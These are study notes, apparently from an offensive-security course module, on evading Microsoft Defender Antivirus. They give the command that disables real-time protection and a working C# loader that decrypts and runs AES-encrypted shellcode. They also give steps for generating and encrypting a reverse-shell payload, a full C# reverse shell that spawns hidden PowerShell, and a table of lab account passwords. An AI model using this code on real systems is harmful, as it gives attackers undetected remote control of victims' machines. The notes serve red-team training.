
---
---
# Introduction To Antivirus Evasion
---
---

> Microsoft Defender Antivirus

```c
two main categories` of detection mechanisms: 

- Static Analysis: which has to do with detecting malware on-disk , before it is run.
- Dynamic Analysis: which concerns detecting active malware in process memory.

- File creation/modification: so that a malicious file may be caught before being executed
- Suspicious behavior: for example, a Microsoft Word instance spawning a PowerShell instance is more often than not malicious behavior
```

```powershell
# Get All-Modules
PS C:\> Get-Command -Module Defender

# Check THe ThreatID
Get-MpThreatDetection -ThreatID 2147894794

# Enable / Disable Real-TIme Protection
PS C:\> Set-MpPreference -DisableRealTimeMonitoring $true
```
---

> Static Analysis

```c
In the context of Microsoft Defender Antivirus, static analysis refers to the detection of malware on disk through signature scans. This method involves checking file hashes, byte patterns, and strings against a database of known malicious values.
```

```c
The signature database used by Microsoft Defender Antivirus is not publicly available; however, we can explore it indirectly with [ExpandDefenderSig.ps1] a reverse engineering script developed by [Matt Graeber] that decompresses Windows Defender Antivirus signatures.

Using the script, we can see for example that "WNcry@2ol7" (one of the strings from the YARA rule above) shows up in `Microsoft's signature database`:

PS C:\Tools\ExpandDefenderSig> Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1

PS C:\Tools\ExpandDefenderSig> ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{50326593-AC5A-4EB5-A3F0-047A75D1470C}\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw
```

```c
ThreatCheck works by splitting a file into chunks and subsequently making Microsoft Defender Antivirus scan them until it finds that triggers a detection. Taking a look at the output, it becomes clear that `Microsoft Defender Antivirus` is detecting the bytes of the Meterpreter shellcode.

C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f .\NotMalware.exe
```

![[36.webp]]

```c
As the Metasploit Framework is a well-known open-source tool, it should not be surprising that Microsoft developed signatures for `Microsoft Defender Antivirus` to catch the shellcode it generates.
```

```c
since that is detectable , the section explains the encryption with 2 methods , the xor and the AES ( the xor is detectable while the AES is not ) below is a c# code that will make a reverse shell
```

```cs
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO; // Added for MemoryStream

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Base64-encoded, AES-encrypted shellcode
            string bufEnc = "WXWWOFvr+edXwuuf3cKIBNbO53NITSPROcQJSN9KG8zmbYaCRtSDxbtQ04XmuJzAHMdiY6i97eyYpG2DZ1XD8KmqToS6bALVY+wpaCRaw61ON1a8NIkFCvjXsN8OxL2keRYUfEJxyiuuoA2cWPuQmIzwYCiYYDnBhajFe9RPNrlAaJUOCQqRC8PrsUW7z1UmtmNSfsIJegCeP6tp+kSPuqqAvb7FDwSqS0lAKdp9BCKetKJBBMnQgJjzMjmOBnp6bFkHCwYOUBjR7VaBMl5ZojtbL4AivaUBGP3W+xq8+AdPMntVrItbMlA1/h/Je1EIlZeCKujudWurwP2RiLNA9XeuELjWc7yemjC9M/YUqDRmAGhtsdndL1Iwk4DQcq2Www4FzMO7BTndDRR147bOM2be8kux3B4dXSFfi7rX5ytMuUV7b/R76isQeVwQQSq3Y+nCMjfCqQsyzbuLwRn9q+lzDjAMrhCumPPkcVaXQeTO0nZoF8YYDXNRDXLSDiBj1Rp7buV7cXE2R3ulMbHNukZZrMKlm5j0eHa+WpVunalbH4nktDERmRkoICR6TzeW70knaA4LQIwXJDPBFUaChIUpOP3XCVhVTEtfpp0oMDINUPhEZwy4+l1s1j/s9UEOpTEjYqHu4l6IUJixSRZKu2pBSNzfD9t54JcW1DvPWEW30kP/4GaERBtImQF4jiVyuN3T+fQVIUdQFdfpMowywToytuQ2w+iV1dsYYMS4cqk5cgULpViM8YsxTuGNnhg8wh+/72CUKJk7UMPUDiXd240WmTVPnKbbW0P9/SPr335RgCmUs8MDbeRl67A1PCY0ELrX+nuOdrGAnDz8hpDSOCm+PhLgeismzEw5tJ4OfPfibKyXl5QmUlWfRW3cSrh5gSGMigsV4SSnW8tYEHM70Gh2y8IRiAFMe47AB4cxby8=";

            // Decode the Base64-encoded shellcode
            byte[] encryptedShellcode = Convert.FromBase64String(bufEnc);

            // AES decryption
            Aes aes = Aes.Create();
            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;

            // Fix: Declare and initialize msDecrypt
            using (var msDecrypt = new MemoryStream(encryptedShellcode))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}

```

---
---

> Dynamic Analysis

```c
Since attackers can easily bypass static analysis, Microsoft Defender Antivirus also utilizes `dynamic analysis`. Certain events can trigger memory scans of a process, such as the creation of a new process or the detection of suspicious behavior.
```

```c
# Option One : ## Modifying the Payload
As stated before, Meterpreter is well-known to Microsoft, therefore, the [MSRC] team have developed various signatures for its unencrypted shellcode. However, one of the methods we can evade behavioral analysis is by modifying the Meterpreter payload in such a way that it either avoids triggering a memory scan or, if scanned, does not match any signatures. Either one of these methods would require modifying the source code of the Meterpreter payload, which is out-of-scope for this module.
```



```c
# Option 2: Changing the Payload : 

Unless using Meterpreter is mandatory, the other method to evade behavioral analysis is changing the payload to a less well-known one. Since we only want to establish a reverse shell, we can replace the Meterpreter stager shellcode with a minimal reverse shell payload.
As an example, let's use [micr0_shell]. From the project description we can see that this program generates `"reverse shell shellcode for Windows x64"`.
```

```c
# Step1 Create A Payload Using micr0
PS C:\Tools\micr0_shell> python.exe .\micr0_shell.py -i [IP] -p 8080 -l csharp
```

```c
# Step 2 send the results to AES Encryptor to make obfuscation , use the link below
```

Resource : [AES Encryption](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')) 

![[51.webp]]

```c
Inside NotMalware, we can replace the `base64` string with this new one and recompile the program.
```

![[59.webp]]

```c
Now, when we run NotMalware.exe from the Desktop with Real-time protection enabled, we notice that we get a reverse shell and can interact with it without getting detected by Microsoft Defender Antivirus.
```

![[53.webp]]




```c
Option 3: Writing Custom Tools
```

```c
Given their prevalence in offensive security operations (and cybercrimes), antivirus solutions maintain various signatures for open-source tools like `Metasploit` and `Mimikatz`. However, it often takes time for antivirus solutions to develop signatures for new and immature tools. In this section, we successfully evaded detection by substituting the `Meterpreter` payload with the micr0_shell payload. This approach was effective because it's probable that `Microsoft Defender Antivirus` does not currently include a signature for this specific shellcode. Consequently, even if a memory scan is initiated, no suspicious events are likely to be detected. However, it's not unlikely that a signature will be added in the future if the use of `micr0_shell` becomes more widespread among attackers.

This brings us to our third and final option, which is the most effective, but also most time-consuming - writing custom tools. When using custom tools, neither `static` nor `behavioral` analysis poses an issue, since they will not match any `known malicious signatures`.

As an example, let's write a simple `TCP reverse shell` program, which will not require any `obfuscation` or `encryption` since it does not use any known malicious component present in an antivirus solution signatures database. Open `Visual Studio 2022` and create a new `Console App (.NET Framework)` project called `RShell`.
```

![[54.webp]]

To develop a reverse shell in C#, we will need to make use of the following classes:

- [System.Net.Sockets.TcpClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-8.0) to handles the `TCP` connection
- [System.Diagnostics.Process](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=net-8.0) to spawn the `cmd.exe` or `powershell.exe` process
- [System.IO.StreamReader](https://learn.microsoft.com/en-us/dotnet/api/system.io.streamreader?view=net-8.0), [System.IO.StreamWriter](https://learn.microsoft.com/en-us/dotnet/api/system.io.streamwriter?view=net-8.0) to `read/write` to the `TCP stream`

One example of a simple C# reverse shell is provided below. It establishes a connection to an IP address and port specified on the command line, spawns a `powershell.exe` process, and redirects communication for `STDOUT`, `STDIN`, and `STDERR` to the process.

```csharp
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell
{
    internal class Program
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it

        static void Main(string[] args)
        {
            // Check for correct number of arguments
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RShell.exe <IP> <Port>");
                return;
            }

            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect(args[0], int.Parse(args[1]));

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }
        
        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
```

```c
When running the program, we get a interactive PowerShell session and we didn't get blocked by Microsoft Defender Antivirus, because we didn't use anything known to be malicious. Even if it decides to do a memory scan of our process when powershell.exe is spawned as a child process, nothing should be detected since we won't be matching any known signatures.
```

![[55.webp]]

Although using custom-made tools is the most effective solution for evading detection, in practice there are limits to both time and budget. Therefore, penetration testers, red teamers, and malicious actors are oftentimes forced to use open-source software at one point or another because it is infeasible to recreate [Rubeus](https://github.com/GhostPack/Rubeus), for example.

---
---

> Process Injection

```c
Process injection is an evasion technique which entails running malicious code within the address space of another process. There are many ways it can be done, including:

1. - Dynamic-link Library Injection An attacker writes the path of a malicious DLL into the address space of a target process and then calls LoadLibrary

2. - Portable Executable Injection An attacker copies code into the address space of a target process and then executes it with CreateRemoteThread

3. - Process Hollowing  An attacker spawns a target process in a suspended state, replaces the entrypoint in memory with their own code, and then resumes the process.

4. - Thread Execution Hijacking: An attacker suspends a thread in a target process, replaces the code with their own malicious code, and then resumes the thread.
```

```c
In this section, we will use Portable Executable Injection to execute our micr0_shell payload from the previous section.
```

---
---

| Username      | Password | Notes                          |
| ------------- | -------- | ------------------------------ |
| Administrator | Eva$i0n! | Built-in administrator account |
| maria         | Eva$i0n! | Administrator                  |
| max           | Eva$i0n! | Standard user                  |

- [ ] how to compile


> Useful tools

[Compiling Using CSC](https://lolbas-project.github.io/lolbas/Binaries/Csc/)
[AES Encryptopn](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')XOR(%7B'option':'Hex','string':'5c'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)) 
